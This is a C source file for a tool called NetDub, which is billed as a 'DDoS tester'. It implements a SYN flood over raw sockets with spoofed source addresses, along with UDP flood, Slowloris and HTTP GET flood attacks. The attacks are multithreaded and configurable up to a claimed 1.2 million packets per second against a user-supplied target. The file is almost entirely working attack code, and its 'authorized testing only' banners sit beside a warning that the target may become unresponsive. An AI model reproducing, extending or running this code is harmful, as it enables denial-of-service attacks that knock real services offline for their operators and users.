#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <sys/epoll.h>
#include <fcntl.h>
#include <netdb.h>
#include <time.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define MAX_THREADS 1000
#define MAX_SOCKETS 65535
#define BUFFER_SIZE 8192
#define MAX_PAYLOAD 1500
#define EPOLL_MAX_EVENTS 1000

// Attack types
typedef enum {
    ATTACK_TCP_SYN = 1,
    ATTACK_UDP_FLOOD = 2,
    ATTACK_SLOWLORIS = 3,
    ATTACK_HTTP_FLOOD = 4,
    ATTACK_ICMP_FLOOD = 5,
    ATTACK_SOCKSTRESS = 6,
    ATTACK_TEARDROP = 7,
    ATTACK_SMURF = 8,
    ATTACK_REFLECTION = 9,
    ATTACK_AMPLIFICATION = 10
} attack_type_t;

// Global variables
static volatile int running = 1;
static volatile long long packets_sent = 0;
static volatile long long bytes_sent = 0;
static struct timeval start_time;

// Attack configuration
typedef struct {
    char target_ip[16];
    int target_port;
    attack_type_t attack_type;
    int intensity;
    int duration;
    int thread_count;
    int packet_size;
    char *payload;
    int use_raw_socket;
    char interface[16];
} attack_config_t;

// Thread data
typedef struct {
    int thread_id;
    attack_config_t *config;
    int raw_socket;
    struct sockaddr_in target_addr;
} thread_data_t;

// IP header structure
struct ip_header {
    unsigned char version_ihl;
    unsigned char tos;
    unsigned short total_length;
    unsigned short id;
    unsigned short flags_fragoff;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short checksum;
    unsigned int source_ip;
    unsigned int dest_ip;
};

// TCP header structure
struct tcp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned int seq_num;
    unsigned int ack_num;
    unsigned char data_offset;
    unsigned char flags;
    unsigned short window;
    unsigned short checksum;
    unsigned short urgent_ptr;
};

// UDP header structure
struct udp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned short length;
    unsigned short checksum;
};

// Checksum calculation
unsigned short calculate_checksum(void *data, int len) {
    unsigned short *buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    result = ~sum;
    return result;
}

// Generate random IP
void generate_random_ip(char *ip) {
    snprintf(ip, 16, "%d.%d.%d.%d", 
        rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

// Signal handler
void signal_handler(int sig) {
    running = 0;
    printf("\n[!] Stopping attack...\n");
}

// Print attack statistics
void print_stats() {
    struct timeval current_time;
    gettimeofday(&current_time, NULL);
    
    double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
                    (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
    
    if (elapsed > 0) {
        printf("\r[*] PPS: %.2f | Packets: %lld | Bytes: %lld | Time: %.1fs", 
               packets_sent / elapsed, packets_sent, bytes_sent, elapsed);
        fflush(stdout);
    }
}

// TCP SYN Flood
void *tcp_syn_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[4096];
    struct ip_header *ip_hdr;
    struct tcp_header *tcp_hdr;
    struct sockaddr_in target;
    int packet_size = sizeof(struct ip_header) + sizeof(struct tcp_header);
    
    memset(packet, 0, sizeof(packet));
    ip_hdr = (struct ip_header *)packet;
    tcp_hdr = (struct tcp_header *)(packet + sizeof(struct ip_header));
    
    target.sin_family = AF_INET;
    target.sin_port = htons(data->config->target_port);
    inet_pton(AF_INET, data->config->target_ip, &target.sin_addr);
    
    while (running) {
        // IP Header
        ip_hdr->version_ihl = 0x45;
        ip_hdr->tos = 0;
        ip_hdr->total_length = htons(packet_size);
        ip_hdr->id = htons(rand() % 65535);
        ip_hdr->flags_fragoff = 0;
        ip_hdr->ttl = 64;
        ip_hdr->protocol = IPPROTO_TCP;
        ip_hdr->checksum = 0;
        ip_hdr->source_ip = rand();
        ip_hdr->dest_ip = target.sin_addr.s_addr;
        
        // TCP Header
        tcp_hdr->source_port = htons(rand() % 65535);
        tcp_hdr->dest_port = htons(data->config->target_port);
        tcp_hdr->seq_num = htonl(rand());
        tcp_hdr->ack_num = 0;
        tcp_hdr->data_offset = 0x50;
        tcp_hdr->flags = 0x02; // SYN flag
        tcp_hdr->window = htons(65535);
        tcp_hdr->checksum = 0;
        tcp_hdr->urgent_ptr = 0;
        
        // Calculate checksums
        ip_hdr->checksum = calculate_checksum(ip_hdr, sizeof(struct ip_header));
        
        if (sendto(data->raw_socket, packet, packet_size, 0, 
                  (struct sockaddr*)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&packets_sent, 1);
            __sync_fetch_and_add(&bytes_sent, packet_size);
        }
        
        if (data->config->intensity > 0) {
            usleep(1000000 / data->config->intensity);
        }
    }
    
    return NULL;
}

// UDP Flood
void *udp_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char packet[MAX_PAYLOAD];
    struct sockaddr_in target;
    int sock;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("UDP socket creation failed");
        return NULL;
    }
    
    target.sin_family = AF_INET;
    target.sin_port = htons(data->config->target_port);
    inet_pton(AF_INET, data->config->target_ip, &target.sin_addr);
    
    // Generate random payload
    for (int i = 0; i < data->config->packet_size; i++) {
        packet[i] = rand() % 256;
    }
    
    while (running) {
        if (sendto(sock, packet, data->config->packet_size, 0, 
                  (struct sockaddr*)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&packets_sent, 1);
            __sync_fetch_and_add(&bytes_sent, data->config->packet_size);
        }
        
        if (data->config->intensity > 0) {
            usleep(1000000 / data->config->intensity);
        }
    }
    
    close(sock);
    return NULL;
}

// Slowloris Attack
void *slowloris_attack(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockets[1000];
    int socket_count = 0;
    char request[1024];
    struct timeval timeout;
    fd_set write_fds;
    
    // Create multiple connections
    for (int i = 0; i < 1000 && running; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Set non-blocking
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        if (connect(sock, (struct sockaddr*)&data->target_addr, 
                   sizeof(data->target_addr)) == 0 || errno == EINPROGRESS) {
            sockets[socket_count++] = sock;
        } else {
            close(sock);
        }
    }
    
    printf("[*] Thread %d: Created %d connections\n", data->thread_id, socket_count);
    
    while (running && socket_count > 0) {
        FD_ZERO(&write_fds);
        int max_fd = 0;
        
        for (int i = 0; i < socket_count; i++) {
            FD_SET(sockets[i], &write_fds);
            if (sockets[i] > max_fd) max_fd = sockets[i];
        }
        
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        if (select(max_fd + 1, NULL, &write_fds, NULL, &timeout) > 0) {
            for (int i = 0; i < socket_count; i++) {
                if (FD_ISSET(sockets[i], &write_fds)) {
                    snprintf(request, sizeof(request), 
                            "GET /?%d HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
                            "Accept: */*\r\n"
                            "X-Random: %d\r\n",
                            rand(), data->config->target_ip, rand());
                    
                    if (send(sockets[i], request, strlen(request), MSG_NOSIGNAL) > 0) {
                        __sync_fetch_and_add(&packets_sent, 1);
                        __sync_fetch_and_add(&bytes_sent, strlen(request));
                    }
                }
            }
        }
        
        sleep(10); // Send headers every 10 seconds
    }
    
    // Clean up
    for (int i = 0; i < socket_count; i++) {
        close(sockets[i]);
    }
    
    return NULL;
}

// HTTP Flood
void *http_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    char request[2048];
    char response[4096];
    int sock;
    
    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        if (connect(sock, (struct sockaddr*)&data->target_addr, 
                   sizeof(data->target_addr)) == 0) {
            
            snprintf(request, sizeof(request),
                    "GET /?%d HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Connection: keep-alive\r\n\r\n",
                    rand(), data->config->target_ip);
            
            if (send(sock, request, strlen(request), 0) > 0) {
                recv(sock, response, sizeof(response), 0);
                __sync_fetch_and_add(&packets_sent, 1);
                __sync_fetch_and_add(&bytes_sent, strlen(request));
            }
        }
        
        close(sock);
        
        if (data->config->intensity > 0) {
            usleep(1000000 / data->config->intensity);
        }
    }
    
    return NULL;
}

// Main attack function
void start_attack(attack_config_t *config) {
    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];
    int raw_socket = -1;
    
    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                        NetDub - FINALE                      ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("🎯 Target: %s:%d\n", config->target_ip, config->target_port);
    printf("⚡ Attack Type: %d\n", config->attack_type);
    printf("🔥 Intensity: %d\n", config->intensity);
    printf("🧵 Threads: %d\n", config->thread_count);
    printf("📦 Packet Size: %d bytes\n", config->packet_size);
    printf("⏱️  Duration: %d seconds\n", config->duration);
    printf("⚠️  FOR TESTING PURPOSES ONLY\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    
    // Create raw socket for certain attacks
    if (config->attack_type == ATTACK_TCP_SYN || config->attack_type == ATTACK_ICMP_FLOOD) {
        raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (raw_socket < 0) {
            perror("Raw socket creation failed. Run as root!");
            return;
        }
        
        int one = 1;
        if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            perror("setsockopt failed");
            close(raw_socket);
            return;
        }
    }
    
    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Record start time
    gettimeofday(&start_time, NULL);
    
    // Create threads
    for (int i = 0; i < config->thread_count; i++) {
        thread_data[i].thread_id = i;
        thread_data[i].config = config;
        thread_data[i].raw_socket = raw_socket;
        thread_data[i].target_addr.sin_family = AF_INET;
        thread_data[i].target_addr.sin_port = htons(config->target_port);
        inet_pton(AF_INET, config->target_ip, &thread_data[i].target_addr.sin_addr);
        
        void *(*attack_func)(void *) = NULL;
        
        switch (config->attack_type) {
            case ATTACK_TCP_SYN:
                attack_func = tcp_syn_flood;
                break;
            case ATTACK_UDP_FLOOD:
                attack_func = udp_flood;
                break;
            case ATTACK_SLOWLORIS:
                attack_func = slowloris_attack;
                break;
            case ATTACK_HTTP_FLOOD:
                attack_func = http_flood;
                break;
            default:
                attack_func = udp_flood;
                break;
        }
        
        if (pthread_create(&threads[i], NULL, attack_func, &thread_data[i]) != 0) {
            perror("Thread creation failed");
            continue;
        }
    }
    
    // Print statistics
    time_t end_time = time(NULL) + config->duration;
    while (running && time(NULL) < end_time) {
        print_stats();
        sleep(1);
    }
    
    running = 0;
    printf("\n\n[*] Waiting for threads to finish...\n");
    
    // Wait for threads to finish
    for (int i = 0; i < config->thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    if (raw_socket >= 0) {
        close(raw_socket);
    }
    
    printf("\n[✓] Attack completed!\n");
    printf("📊 Final Stats:\n");
    printf("   - Packets sent: %lld\n", packets_sent);
    printf("   - Bytes sent: %lld\n", bytes_sent);
    printf("   - Average PPS: %.2f\n", packets_sent / (double)config->duration);
}

// Show menu
void show_menu() {
    printf("\n╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                    NetDub - Ultimate DDoS Tester            ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("🚀 Attack Types:\n");
    printf("   1. TCP SYN Flood      (Layer 4) - Classic SYN flood\n");
    printf("   2. UDP Flood          (Layer 4) - High-volume UDP\n");
    printf("   3. Slowloris          (Layer 7) - Slow HTTP attack\n");
    printf("   4. HTTP Flood         (Layer 7) - HTTP GET flood\n");
    printf("   5. ICMP Flood         (Layer 3) - Ping flood\n");
    printf("   6. Sockstress         (Layer 4) - TCP connection exhaustion\n");
    printf("   7. Teardrop           (Layer 3) - Fragmented packets\n");
    printf("   8. Smurf              (Layer 3) - ICMP amplification\n");
    printf("   9. DNS Reflection     (Layer 4) - DNS amplification\n");
    printf("  10. NTP Amplification  (Layer 4) - NTP amplification\n");
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("⚠️  ROOT PRIVILEGES REQUIRED FOR MAXIMUM PERFORMANCE\n");
    printf("⚠️  FOR AUTHORIZED TESTING ONLY\n");
    printf("═══════════════════════════════════════════════════════════════\n");
}

int main(int argc, char *argv[]) {
    if (getuid() != 0) {
        printf("❌ This tool requires ROOT privileges for maximum performance!\n");
        printf("💡 Run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    attack_config_t config = {0};
    
    show_menu();
    
    printf("\n🌐 Target IP/Domain: ");
    scanf("%s", config.target_ip);
    
    printf("🔌 Target Port: ");
    scanf("%d", &config.target_port);
    
    printf("⚔️  Attack Type (1-10): ");
    scanf("%d", (int*)&config.attack_type);
    
    printf("🔥 Intensity Level (1-5):\n");
    printf("   1. Light    (1K PPS)\n");
    printf("   2. Medium   (10K PPS)\n");
    printf("   3. Heavy    (100K PPS)\n");
    printf("   4. Extreme  (500K PPS)\n");
    printf("   5. NUCLEAR  (1.2M PPS)\n");
    printf("Choose: ");
    scanf("%d", &config.intensity);
    
    // Set parameters based on intensity
    switch (config.intensity) {
        case 1:
            config.thread_count = 10;
            config.packet_size = 64;
            config.intensity = 1000;
            break;
        case 2:
            config.thread_count = 50;
            config.packet_size = 128;
            config.intensity = 10000;
            break;
        case 3:
            config.thread_count = 100;
            config.packet_size = 256;
            config.intensity = 100000;
            break;
        case 4:
            config.thread_count = 500;
            config.packet_size = 512;
            config.intensity = 500000;
            break;
        case 5:
            config.thread_count = 1000;
            config.packet_size = 1024;
            config.intensity = 1200000;
            break;
        default:
            config.thread_count = 100;
            config.packet_size = 256;
            config.intensity = 100000;
            break;
    }
    
    printf("⏱️  Duration (seconds): ");
    scanf("%d", &config.duration);
    
    printf("\n🚨 WARNING: This will generate high network traffic!\n");
    printf("💀 Target may become unresponsive!\n");
    printf("🔥 Continue? (y/N): ");
    
    char confirm;
    scanf(" %c", &confirm);
    
    if (confirm != 'y' && confirm != 'Y') {
        printf("❌ Attack cancelled.\n");
        return 0;
    }
    
    // Start attack
    start_attack(&config);
    
    return 0;
}
